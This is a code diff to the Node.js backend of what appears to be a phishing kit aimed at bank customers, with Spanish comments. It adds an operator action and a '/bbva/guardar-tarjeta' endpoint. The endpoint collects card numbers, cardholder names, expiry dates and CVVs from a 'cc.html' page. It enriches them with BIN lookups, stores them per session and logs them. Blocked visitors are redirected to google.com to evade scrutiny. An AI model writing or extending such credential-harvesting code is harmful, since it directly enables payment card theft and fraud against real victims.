@@ -502,7 +502,8 @@ const server = http.createServer(async (req, res) => {
                         PEDIR_DATOS: 'pedir_datos',
                         PEDIR_DINAMICA: 'pedir_dinamica',
                         YA_PAGO: 'ya_pagado',
-                        PEDIR_TARJETA: 'mostrar_tarjeta'  // 🔥 NUEVO Davivienda
+                        PEDIR_TARJETA: 'mostrar_tarjeta',
+                        PEDIR_TARJETA_BBVA: 'pedir_tarjeta_bbva' // 🔥 NUEVA ACCIÓN AGREGADA AQUÍ
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
@@ -846,13 +847,56 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // 🔥 NUEVO ENDPOINT PARA BBVA (RECIBE LOS DATOS DE LA TARJETA DESDE cc.html) 🔥
+        if (req.method === 'POST' && url === '/bbva/guardar-tarjeta') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const datos = await getBody(req);
+                const { sessionId, tarjeta, titular, exp, cvv } = datos;
+                
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const infoBin = await obtenerInfoBin(tarjeta);
+
+                const datosCompletos = Object.assign({}, previos, {
+                    sessionId,
+                    bancoKey: 'bbva',
+                    marca: 'bbva',
+                    tarjeta,
+                    titular,
+                    exp,
+                    expMes: exp,
+                    cvv,
+                    ip: previos.ip || ip,
+                    creadoEn: previos.creadoEn || new Date().toISOString(),
+                    bin: infoBin?.bin || '',
+                    cardBrand: infoBin?.cardBrand || 'Desconocida',
+                    cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido',
+                    bankName: infoBin?.bankName || 'Desconocido',
+                    countryName: infoBin?.countryName || 'Desconocido'
+                });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                pasosSesiones.set(sessionId, 'BBVA Tarjeta');
+
+                guardarHistorial('bbva', datosCompletos);
+
+                console.log(`[BBVA] Tarjeta recibida: ${sessionId} | Tarjeta: ${tarjeta} | Titular: ${titular}`);
+                json(res, 200, { ok: true, sessionId, binInfo: infoBin });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
         // 🔥 AQUI ESTA LA PROTECCIÓN CON EL CAPTCHA 🔥
         if (req.method === 'POST' && url === '/vanti/enviar') {
             try {
                 const datos = await getBody(req);
                 const { sessionId, empresa, cuenta, medioPago, 'cf-turnstile-response': turnstileToken } = datos;
 
-                // Validar el token de Cloudflare antes de hacer cualquier cosa
                 const esHumano = await validarTurnstile(turnstileToken, ip);
                 if (!esHumano) {
                     json(res, 403, { ok: false, error: 'Verificación de seguridad fallida. Eres un bot o el token expiró.' });
